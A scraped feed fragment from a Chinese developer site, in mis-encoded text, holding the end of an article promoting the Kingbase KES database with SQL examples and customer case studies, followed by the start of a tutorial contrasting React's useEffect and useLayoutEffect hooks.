<li>JSON æ•°æ®ç±»å‹ï¼ˆæ—¥å¿—/æ¶ˆæ¯ç¤ºä¾‹ï¼‰ï¼šç°åœ¨å¾ˆå¤šä¸šåŠ¡æ—¥å¿—å’Œæ¶ˆæ¯éƒ½å–œæ¬¢ç”¨ JSON æ ¼å¼ã€‚KES åŸç”Ÿå°±æ”¯æŒ JSON æ•°æ®ç±»å‹ï¼Œä½ å¯ä»¥ç›´æ¥æŠŠ JSON å­˜åˆ°æ•°æ®åº“é‡Œï¼Œå¹¶ä¸”ç”¨å®ƒæä¾›çš„å‡½æ•°æ–¹ä¾¿åœ°æå–é‡Œé¢çš„å­—æ®µï¼Œè¿›è¡ŒæŸ¥è¯¢å’Œåˆ†æã€‚</li>
</ul>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> event_logs (
  id       BIGSERIAL <span class="hljs-keyword">PRIMARY</span> KEY,
  occurred <span class="hljs-type">TIMESTAMP</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> now(),
  payload  JSON <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>
);

<span class="hljs-comment">-- æå– JSON å­—æ®µï¼ˆç¤ºä¾‹å‡½æ•°æŒ‰ç‰ˆæœ¬æä¾›ï¼‰</span>
<span class="hljs-keyword">SELECT</span> payload<span class="hljs-operator">-</span><span class="hljs-operator">&gt;&gt;</span><span class="hljs-string">'eventType'</span> <span class="hljs-keyword">AS</span> event_type,
       (payload<span class="hljs-operator">-</span><span class="hljs-operator">&gt;&gt;</span><span class="hljs-string">'severity'</span>)::<span class="hljs-type">int</span> <span class="hljs-keyword">AS</span> severity
<span class="hljs-keyword">FROM</span> event_logs
<span class="hljs-keyword">WHERE</span> occurred <span class="hljs-operator">&gt;=</span> now() <span class="hljs-operator">-</span> <span class="hljs-type">interval</span> <span class="hljs-string">'1 day'</span>;
</code></pre>
<h2 data-id="heading-7">æ¡ˆä¾‹åˆ†æ</h2>
<p>åˆ°äº†çœŸé‡‘ç™½é“¶é‡‡è´­å’Œé€‰å‹çš„æ—¶å€™ï¼Œè¯´ä¸€åƒé“ä¸€ä¸‡ï¼Œä¸å¦‚çœ‹çœ‹åˆ«äººå®¶æ˜¯æ€ä¹ˆç”¨çš„ã€‚ä¸‹é¢æˆ‘ä»¬å°±æ‰’ä¸€æ‰’å®˜æ–¹å…¬å¼€çš„å‡ ä¸ªæ¡ˆä¾‹ï¼Œç”¨äº‹å®è¯´è¯ã€‚</p>
<ul>
<li>
<p>ä¸­å›½æµ·æ´‹çŸ³æ²¹é›†å›¢ï¼ˆä¸­å›½æµ·æ²¹ï¼‰</p>
<ul>
<li>è§„æ¨¡æœ‰å¤šå¤§å‘¢ï¼Ÿè¶…è¿‡ 300 ä¸ªä¸šåŠ¡ç³»ç»Ÿï¼Œå…¶ä¸­è¿˜åŒ…æ‹¬ 100 å¤šä¸ªæ ¸å¿ƒç³»ç»Ÿï¼Œå…¨éƒ½ä»åŸæ¥çš„æ•°æ®åº“è¿ç§»åˆ°äº†é‡‘ä»“ KESã€‚è¿™äº›ç³»ç»Ÿè¦†ç›–äº†ä»ä¸Šæ¸¸çš„å‹˜æ¢å¼€å‘ï¼Œåˆ°ä¸­æ¸¸çš„ç”Ÿäº§è¿è¥ï¼Œå†åˆ°åå°çš„ç»è¥ç®¡ç†å’Œå®‰å…¨ç›‘æ§ï¼Œå¯ä»¥è¯´æ˜¯æŠŠæ•´ä¸ªå®¶åº•éƒ½æ¬ä¸Šæ¥äº†ã€‚</li>
<li>å¯ç”¨æ€§æ€ä¹ˆæ ·ï¼Ÿå®¹ç¾èƒ½åŠ›åšåˆ°äº† RPO æ¥è¿‘ 0ï¼ŒRTO å°äº 30 ç§’ã€‚è¿™æ„å‘³ç€å°±ç®—å‡ºäº†é—®é¢˜ï¼Œæ•°æ®åŸºæœ¬ä¸ä¸¢ï¼ŒåŠåˆ†é’Ÿå†…å°±èƒ½æ¢å¤ã€‚åƒåº”æ€¥æŒ‡æŒ¥ã€å·¥ä¸šäº’è”ç½‘å®‰å…¨ç›‘æ§ã€é’»äº•ä½œä¸šè¿™äº›ä¸€ç§’éƒ½ä¸èƒ½åœçš„å…³é”®ä¸šåŠ¡ï¼Œå…¨é è¿™å¥—æ¶æ„æ’‘ç€ã€‚</li>
<li>å®‰å…¨è¿™å—ä¹Ÿæ¯«ä¸å«ç³Šã€‚KES å†…ç½®äº†å¥½å¤šå±‚å®‰å…¨é˜²æŠ¤ï¼Œè¿˜æ‹¿åˆ°äº†å›½å®¶æƒå¨æœºæ„æœ€é«˜ç­‰çº§çš„å®‰å…¨è®¤è¯ EAL4+ã€‚ä¸ç®¡æ˜¯ç­‰çº§ä¿æŠ¤è¿˜æ˜¯å›½å¯†ç®—æ³•çš„è¦æ±‚ï¼Œéƒ½èƒ½æ»¡è¶³ã€‚è€Œä¸”å®ƒè·Ÿå„ç§å›½äº§çš„ç¡¬ä»¶ã€è½¯ä»¶ã€äº‘å¹³å°éƒ½èƒ½å¾ˆå¥½åœ°é…åˆã€‚</li>
<li>è¿ç§»å’Œè¿ç»´é¡ºä¸é¡ºï¼Ÿä¸­æµ·æ²¹ç”¨äº†é‡‘ä»“å…¨å®¶æ¡¶å·¥å…·ï¼ˆKDTS/KFS/KEMCCï¼‰ï¼Œå®ç°äº†å¹³æ»‘è¿ç§»å’Œå®æ—¶çš„æ•°æ®åŒæ­¥ï¼Œæœ€åè¿˜èƒ½æŠŠæ‰€æœ‰æ•°æ®åº“éƒ½ç»Ÿä¸€ç®¡èµ·æ¥ã€‚æ•´ä¸ªè¿‡ç¨‹å¯¹ä¸šåŠ¡åŸºæœ¬æ²¡å½±å“ï¼Œåšåˆ°äº†â€œæ— æ„Ÿåˆ‡æ¢â€ã€‚</li>
</ul>
</li>
<li>
<p>å›½å®¶ç”µç½‘ï¼ˆæ™ºèƒ½ç”µç½‘è°ƒåº¦ä¸æ–°ä¸€ä»£é›†æ§ç³»ç»Ÿï¼‰</p>
<ul>
<li>å›½å®¶ç”µç½‘çš„æ ¸å¿ƒä¸šåŠ¡â€”â€”æ™ºèƒ½ç”µç½‘è°ƒåº¦ç³»ç»Ÿï¼ˆD5000ï¼‰å’Œæ–°ä¸€ä»£çš„é›†æ§ç³»ç»Ÿï¼Œè·‘åœ¨é‡‘ä»“æ•°æ®åº“ä¸Šå·²ç»å¾ˆå¤šå¹´äº†ï¼Œä¸€ç›´éå¸¸ç¨³å®šã€‚è¿™å¥—ç³»ç»Ÿåœ¨å…¨å›½å¾ˆå¤šçœå¸‚éƒ½ä¸Šäº†çº¿ï¼Œå®ç°äº†â€œæ— äººå€¼å®ˆã€é›†ä¸­ç›‘æ§â€çš„æ™ºèƒ½è¿ç»´ï¼Œæ•ˆç‡å¤§å¤§æå‡ã€‚</li>
<li>ç”µç½‘è¿™ä¸ªè¡Œä¸šï¼Œç‰¹ç‚¹éå¸¸é²œæ˜ï¼šæ•°æ®é‡‡é›†å’Œç›‘æ§æ˜¯ä¸€ä½“çš„ï¼Œæœ‰æµ·é‡çš„æ•°æ®éœ€è¦é«˜é¢‘ç‡åœ°å†™å…¥ï¼Œè¿˜å¾—ä¿è¯è·¨åŒºåŸŸæ•°æ®åŒæ­¥çš„å‡†ç¡®å’Œå®‰å…¨ã€‚è¿™å¯¹æ•°æ®åº“çš„è¦æ±‚æé«˜ï¼Œå¿…é¡»è¦æœ‰è¶…å¼ºçš„ååèƒ½åŠ›å’Œå¹¿åŸŸç½‘ä¸‹æ•°æ®ä¸€è‡´æ€§çš„å¤„ç†èƒ½åŠ›ã€‚</li>
</ul>
</li>
<li>
<p>å¤®ä¼æ•´ä½“ä¸è¡Œä¸šè¦†ç›–</p>
<ul>
<li>ä»æ•´ä¸ªå¤®ä¼å¸‚åœºæ¥çœ‹ï¼Œé‡‘ä»“å®˜æ–¹çš„æ•°æ®æ˜¾ç¤ºï¼ŒKES çš„æ€»è£…æœºé‡å·²ç»è¶…è¿‡äº† 100 ä¸‡å¥—ï¼Œè¦†ç›–äº†èƒ½æºã€é‡‘èã€äº¤é€šã€åŒ»ç–—ã€æ”¿åŠ¡ç­‰ 30 å¤šä¸ªè¡Œä¸šã€‚åœ¨æœ€å…³é”®çš„åº”ç”¨é¢†åŸŸï¼Œå®ƒçš„é”€é‡å·²ç»è¿ç»­å››å¹´éƒ½æ˜¯å›½äº§æ•°æ®åº“é‡Œçš„ç¬¬ä¸€åã€‚</li>
</ul>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4b67ba1361804cdab213cafa30662575~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764591898&amp;x-signature=mwQXMVlPOWC3M1S5zMJHGjkEAmU%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-8">ç»“è¯­</h2>
<p>æ€»çš„æ¥è¯´ï¼Œå¯¹äºå¤®ä¼å’Œå›½ä¼ï¼Œæ•°æ®åº“è¿™ä¸œè¥¿ï¼Œä¸æ˜¯è¯´â€œèƒ½è·‘èµ·æ¥â€å°±ä¸‡äº‹å¤§å‰äº†ï¼Œè€Œæ˜¯è¦è¿½æ±‚â€œç¨³ã€å‡†ã€å¿«ã€å¯æ§â€ã€‚ä»å’±ä»¬å‰é¢çš„åˆ†æèƒ½çœ‹å‡ºæ¥ï¼Œé‡‘ä»“æ•°æ®åº“åœ¨å…¼å®¹æ€§ã€å¹³æ»‘è¿ç§»ã€é«˜å¯ç”¨å’Œå®‰å…¨åˆè§„è¿™äº›æ–¹é¢ï¼Œä¸ä»…æœ‰å®Œæ•´çš„æŠ€æœ¯æ–¹æ¡ˆï¼Œè¿˜æœ‰ä¸€æ•´å¥—çš„å·¥å…·æ¥ä¿é©¾æŠ¤èˆªï¼Œå¹¶ä¸”å·²ç»åœ¨èƒ½æºã€ç”µåŠ›è¿™äº›æ ¸å¿ƒè¡Œä¸šé‡Œå®æ‰“å®åœ°å¹²äº†å¥½å¤šå¹´ï¼Œç»å—ä½äº†è€ƒéªŒã€‚å¦‚æœä½ ä¹Ÿæ‰“ç®—ç”¨ï¼Œè¿™é‡Œæœ‰å‡ æ¡å®åœ¨çš„å»ºè®®ï¼š</p>
<ul>
<li>å…ˆæŠŠä½ çš„æ ¸å¿ƒæŒ‡æ ‡ææ¸…æ¥šï¼Œæ¯”å¦‚å¯¹æ•°æ®ä¸¢å¤±å’Œä¸šåŠ¡ä¸­æ–­çš„å®¹å¿åº¦ï¼ˆRPO/RTOï¼‰ã€ç³»ç»Ÿååé‡è¦æ±‚ï¼ˆTPS/QPSï¼‰ã€æ•°æ®æ¨¡å‹çš„å¤æ‚åº¦ç­‰ç­‰ï¼Œç„¶åæ ¹æ®è¿™äº›æ¥é€‰æ‹©æœ€åˆé€‚çš„é«˜å¯ç”¨æ¶æ„å’Œåˆ†åŒºç­–ç•¥ï¼›</li>
<li>å®‰å…¨ä½“ç³»ä¸èƒ½ä¸€è¹´è€Œå°±ï¼Œä½†å¯ä»¥å…ˆæŠŠâ€œä¸‰æƒåˆ†ç«‹ + SSL + å®¡è®¡ + MACâ€è¿™ä¸€å¥—ç»„åˆæ‹³ä½œä¸ºå®‰å…¨åŸºçº¿ï¼Œç„¶åä¸€æ­¥æ­¥åœ°è½åœ°ï¼›</li>
<li>è¿ç§»çš„æ—¶å€™ï¼Œåˆ«å¿˜äº†é‡‘ä»“æä¾›çš„é‚£ä¸€å¥—å®è´å·¥å…·ï¼ˆKDMS/KDTS/KFS/KEMCCï¼‰ï¼Œä¸€å®šè¦ç”¨è¶³ç”¨å¥½ã€‚æœ€å¥½é‡‡ç”¨æ–°æ—§ç³»ç»Ÿå¹¶è¡Œè·‘ä¸€æ®µæ—¶é—´ï¼ˆåŒè½¨å¹¶è¡Œï¼‰ï¼Œå†æŠŠçœŸå®ä¸šåŠ¡çš„è®¿é—®å‹åŠ›åœ¨æ–°ç³»ç»Ÿä¸Šæ¨¡æ‹Ÿä¸€éï¼ˆè´Ÿè½½å›æ”¾ï¼‰ï¼Œç¡®ä¿ä¸‡æ— ä¸€å¤±ï¼›</li>
<li>å¦‚æœä½ çš„ä¸šåŠ¡å¹¶å‘é‡å¾ˆå¤§ï¼Œæˆ–è€…åˆ†åŒºè¡¨ç‰¹åˆ«å¤šï¼Œè®°å¾—æŠŠæ‰§è¡Œè®¡åˆ’ä¼˜åŒ–çš„ç›¸å…³å‚æ•°æ‰“å¼€ï¼Œå¹¶ä¸”è¦å»ºç«‹ä¸€å¥—æŒç»­çš„ç›‘æ§æœºåˆ¶ï¼Œéšæ—¶è§‚å¯Ÿæ•°æ®åº“çš„æ€§èƒ½è¡¨ç°ã€‚</li>
</ul>
<p>è®°ä½ï¼Œåªè¦â€œæ¶æ„é€‰å¾—å‡†ã€å·¥å…·ç”¨åˆ°ä½ã€ç­–ç•¥æ‹¿å¾—ç¨³ã€éªŒè¯åšåˆ°è¶³â€ï¼Œå°±ä¸€å®šèƒ½æŠŠå›½äº§æ•°æ®åº“ç”¨å¥½ï¼Œè®©å®ƒæˆä¸ºå’±ä»¬ä¸šåŠ¡é•¿æœŸã€ç¨³å®šã€å¯é çš„æ•°å­—åº•åº§ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React - ã€useEffect ä¸ useLayoutEffectã€‘ åŒºåˆ« åŠ ä½¿ç”¨åœºæ™¯]]></title>    <link>https://juejin.cn/post/7576105442213609522</link>    <guid>https://juejin.cn/post/7576105442213609522</guid>    <pubDate>2025-11-24T12:27:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576105442213609522" data-draft-id="7576086557716512819" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React - ã€useEffect ä¸ useLayoutEffectã€‘ åŒºåˆ« åŠ ä½¿ç”¨åœºæ™¯"/> <meta itemprop="keywords" content="React.js,å‰ç«¯"/> <meta itemprop="datePublished" content="2025-11-24T12:27:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¦æ­¢æ‘†çƒ‚_æ‰æµ…"/> <meta itemprop="url" content="https://juejin.cn/user/92819673587448"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React - ã€useEffect ä¸ useLayoutEffectã€‘ åŒºåˆ« åŠ ä½¿ç”¨åœºæ™¯
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/92819673587448/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¦æ­¢æ‘†çƒ‚_æ‰æµ…
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T12:27:37.000Z" title="Mon Nov 24 2025 12:27:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{position:relative;word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;color:#282d36}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:30px;margin-bottom:5px;color:#2f845e}.markdown-body h2{font-size:22px;display:inline-block;font-weight:700;background:#2f845e;color:#fff;padding:6px 8px 0 0;border-top-right-radius:6px;margin-right:2px;box-shadow:6px 3px 0 0 rgba(47,132,194,.2)}.markdown-body h2:before{content:" ";display:inline-block;width:8px}.markdown-body h2:after{content:" ";position:absolute;display:block;width:calc(100% - 32px);border-bottom:3px solid #2f845e}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%;box-shadow:6px 6px 6px #888}.markdown-body hr{border:none;border-top:1px solid rgba(66,185,131,.15);margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#f6ffed;color:#52c41a;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:16px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#262626;border:1px solid #2f845e;border-top:8px solid #2f845e;background:linear-gradient(180deg,rgba(66,185,131,.1),transparent)!important}.markdown-body pre&gt;code.hljs[lang]:before{top:8px!important;color:#2f845e!important}.markdown-body pre&gt;code.language-awesome_error{border:1px solid #ff4d4f!important;border-left-width:8px;font-size:14px;font-weight:700;padding:15px 12px 15px 16px;margin:0;word-break:normal;white-space:break-spaces;display:block;overflow-x:auto;color:#ff4d4f!important;background:#fff2f0!important}.markdown-body pre&gt;code.language-awesome_error:before{content:"!"!important;position:absolute!important;top:50%!important;left:-9px!important;transform:translateY(-14px)!important;background:#ff4d4f!important;color:#fff!important;border:2px solid #fff!important;display:flex;align-items:center;justify-content:center;width:22px;height:22px;border-radius:100%;font-weight:700;font-family:Dosis,Source Sans Pro,Helvetica Neue,Arial,sans-serif;font-size:16px}.markdown-body pre&gt;code.language-awesome_warn{border:1px solid #ffc46f!important;border-left-width:8px;font-size:14px;font-weight:700;padding:15px 12px 15px 16px;margin:0;word-break:normal;white-space:break-spaces;display:block;overflow-x:auto;color:#ffc46f!important;background:#fffbe6!important}.markdown-body pre&gt;code.language-awesome_warn:before{content:"â˜‚"!important;position:absolute;top:50%!important;left:-9px!important;transform:translateY(-14px)!important;background:#ffc46f!important;color:#fff!important;border:2px solid #fff!important;display:flex;align-items:center;justify-content:center;width:22px;height:22px;border-radius:100%;font-weight:700;font-family:Dosis,Source Sans Pro,Helvetica Neue,Arial,sans-serif;font-size:16px}.markdown-body pre&gt;code.language-awesome_success{border:1px solid #52c41a!important;border-left-width:8px;font-size:14px;font-weight:700;padding:15px 12px 15px 16px;margin:0;word-break:normal;white-space:break-spaces;display:block;overflow-x:auto;color:#52c41a!important;background:#f6ffed!important}.markdown-body pre&gt;code.language-awesome_success:before{content:"âœ“"!important;position:absolute!important;top:50%!important;left:-9px!important;transform:translateY(-14px)!important;background:#52c41a!important;color:#fff!important;border:2px solid #fff!important;display:flex;align-items:center;justify-content:center;width:22px;height:22px;border-radius:100%;font-weight:700;font-family:Dosis,Source Sans Pro,Helvetica Neue,Arial,sans-serif;font-size:16px}.markdown-body pre&gt;code.language-awesome_info{border:1px solid #1890ff!important;border-left-width:8px;font-size:14px;font-weight:700;padding:15px 12px 15px 16px;margin:0;word-break:normal;white-space:break-spaces;display:block;overflow-x:auto;color:#1890ff!important;background:#e6f7ff!important}.markdown-body pre&gt;code.language-awesome_info:before{content:"i"!important;position:absolute!important;top:50%!important;left:-9px!important;transform:translateY(-14px)!important;background:#1890ff!important;color:#fff!important;border:2px solid #fff!important;display:flex;align-items:center;justify-content:center;width:22px;height:22px;border-radius:100%;font-weight:700;font-family:Dosis,Source Sans Pro,Helvetica Neue,Arial,sans-serif;font-size:16px}.markdown-body strong{background-color:inherit;color:#2f845e}.markdown-body em{background-color:inherit;color:#949415}.markdown-body a{text-decoration:none;color:#2f8e54;border-bottom:1px solid #3f9e64}.markdown-body a:active,.markdown-body a:hover{color:#3f9e64}.markdown-body a[class^=footnote]{margin-left:4px}.markdown-body a:before{content:"â¤ "}.markdown-body table{font-size:12px;width:100%;max-width:100%;overflow:auto;border:2px solid #2f8e54}.markdown-body thead{background:#2f8e54;color:#fff;text-align:left;font-weight:700}.markdown-body tr:nth-child(2n){background-color:rgba(153,255,188,.1)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:22px}.markdown-body td{min-width:120px}.markdown-body blockquote{padding:1px 22px;margin:22px 0;border-left:6px solid #2f845e;background-color:rgba(66,185,131,.1);border-radius:2px}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#2f845e}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px;color:#282d36}.markdown-body del{color:#2f845e}.markdown-body input[type=checkbox]:checked:before{content:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAA/klEQVQ4T72TMU7DQBBF318XdFR06egQEnAXRINEGlqgowoIR8AF4AZOZ4JEGq5AC5EixBU4A55BNrEVHAcSBTHlaubt37/zxZKlcn7n6mDPXJvz8IJ89HzWu8t7C8D2dfsY52ae4apHnLx0ktsCsHXZjiUuFgG40x2eJ/H/AhztB+zDUTpLwWj8jGkzxSHiHaMPrDQC8sMoilKzLAUqiKQjmb+ZuAdW80tmelCHODoNgSfP7AFprTTaRTzsJN1GEyuIZ7uW6TEEHwCtyV/6EVBKJHhfzgC0Xv/iXwEFBF4FG0378bd7sPQq5xK/hSnk6sdlX3mZrKkwLZKBeu8n9XuWEUE7X+YAAAAASUVORK5CYII=);position:relative;top:-1px;left:-1px}.markdown-body .math .katex{font-family:Menlo,Monaco,Consolas,Courier New,monospace;word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#f6ffed;color:#52c41a;font-size:.87em;padding:.065em .4em}@media (max-width:720px){.markdown-body h1{font-size:22px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">useEffect vs useLayoutEffect å®Œå…¨æŒ‡å—</h2>
<h3 data-id="heading-1">ğŸ¯ æ ¸å¿ƒåŒºåˆ«ï¼šæ‰§è¡Œæ—¶æœº</h3>
<h4 data-id="heading-2">useEffectï¼ˆå¼‚æ­¥å‰¯ä½œç”¨ï¼‰</h4>
<pre><code class="hljs language-markdown" lang="markdown">React æ¸²æŸ“ DOM
<span class="hljs-code">    â†“
æµè§ˆå™¨ç»˜åˆ¶å±å¹•
    â†“
æ‰§è¡Œ useEffect â† ç”¨æˆ·å·²ç»çœ‹åˆ° DOM
    â†“
å¯èƒ½å¯¼è‡´å±å¹•é—ªçƒ
</span></code></pre>
<h4 data-id="heading-3">useLayoutEffectï¼ˆåŒæ­¥å‰¯ä½œç”¨ï¼‰</h4>
<pre><code class="hljs language-markdown" lang="markdown">React æ¸²æŸ“ DOM
<span class="hljs-code">    â†“
æ‰§è¡Œ useLayoutEffect â† ç«‹å³åŒæ­¥æ‰§è¡Œ
    â†“
æµè§ˆå™¨ç»˜åˆ¶å±å¹•ï¼ˆå·²æ˜¯æœ€ç»ˆæ•ˆæœï¼‰
    â†“
ç”¨æˆ·çœ‹åˆ°æœ€ç»ˆç»“æœï¼ˆæ— é—ªçƒï¼‰
</span></code></pre>
<hr/>
<h3 data-id="heading-4">ğŸ“Š è¯¦ç»†å¯¹æ¯”è¡¨</h3>








































<table><thead><tr><th>ç‰¹æ€§</th><th>useEffect</th><th>useLayoutEffect</th></tr></thead><tbody><tr><td><strong>æ‰§è¡Œæ—¶æœº</strong></td><td>DOM æ›´æ–°åï¼Œ<strong>æµè§ˆå™¨ç»˜åˆ¶å‰</strong></td><td>DOM æ›´æ–°åï¼Œ<strong>ç«‹å³åŒæ­¥æ‰§è¡Œ</strong></td></tr><tr><td><strong>é˜»å¡æ¸²æŸ“</strong></td><td>âŒ ä¸é˜»å¡</td><td>âœ… ä¼šé˜»å¡æµè§ˆå™¨ç»˜åˆ¶</td></tr><tr><td><strong>æ€§èƒ½</strong></td><td>â­â­â­â­â­ æ›´å¥½</td><td>â­â­â­ å¯èƒ½å¡é¡¿</td></tr><tr><td><strong>ä½¿ç”¨é¢‘ç‡</strong></td><td>99% çš„æƒ…å†µç”¨è¿™ä¸ª</td><td>ç‰¹å®šåœºæ™¯ç”¨</td></tr><tr><td><strong>æœåŠ¡ç«¯æ¸²æŸ“</strong></td><td>âœ… æ”¯æŒ</td><td>âŒ ä¼šæŠ¥è­¦å‘Š</td></tr><tr><td><strong>æ¸…ç†å‡½æ•°æ‰§è¡Œ</strong></td><td>DOM æ›´æ–°å‰æ‰§è¡Œ</td><td>DOM æ›´æ–°å‰æ‰§è¡Œ</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-5">ğŸ”´ useEffect æ‰§è¡Œæ—¶é—´çº¿</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Component</span>(<span class="hljs-params"/>) {
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'1. useEffect æ‰§è¡Œ'</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'2. useEffect æ¸…ç†å‡½æ•°'</span>);
  }, []);

  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'0. ç»„ä»¶æ¸²æŸ“'</span>);
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>Hello<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;
}

<span class="hljs-comment">// æ‰§è¡Œé¡ºåºï¼š</span>
<span class="hljs-comment">// 0. ç»„ä»¶æ¸²æŸ“</span>
<span class="hljs-comment">// 1. useEffect æ‰§è¡Œ</span>
<span class="hljs-comment">// 2. useEffect æ¸…ç†å‡½æ•°ï¼ˆå¸è½½æˆ–ä¾èµ–å˜åŒ–æ—¶ï¼‰</span>
</code></pre>
<hr/>
